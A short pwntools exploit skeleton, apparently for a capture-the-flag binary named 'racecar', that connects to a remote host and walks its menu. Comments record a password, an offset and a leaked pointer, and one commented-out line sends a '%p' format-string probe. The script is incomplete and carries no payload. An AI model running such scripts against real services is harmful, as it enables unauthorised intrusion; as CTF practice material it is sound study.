from pwn import *

def main ():
	#io = process('./racecar')
	io = remote ('139.59.166.5', '30771')

	#automagically set all of the appropriate values
	context.binary = './racecar'
	#context(os='linux', arch= 'amd64')

# Enable verbose logging so we can see exactly what is being sent (info/debug)
	context.log_level = 'info'

	

	#Enumerating the binary
	#password = 'b4tp@$$w0rd!'
	#return_address_offset = 84
	#max_payload_length = 137


	
	

	io.sendlineafter('Name: ', 'Jonny')
	
	io.sendlineafter('Nickname: ', 'sack')
	
	io.sendlineafter('> ', '1')
	
	io.sendlineafter('> ', '2')

	io.sendlineafter('> ', '2')

	io.sendlineafter('> ', '1')
	#leaks pointer address 0x57918200
	#io.sendline("%p")

	io.sendline()
	
	io.interactive()






if __name__=='__main__':
	main()

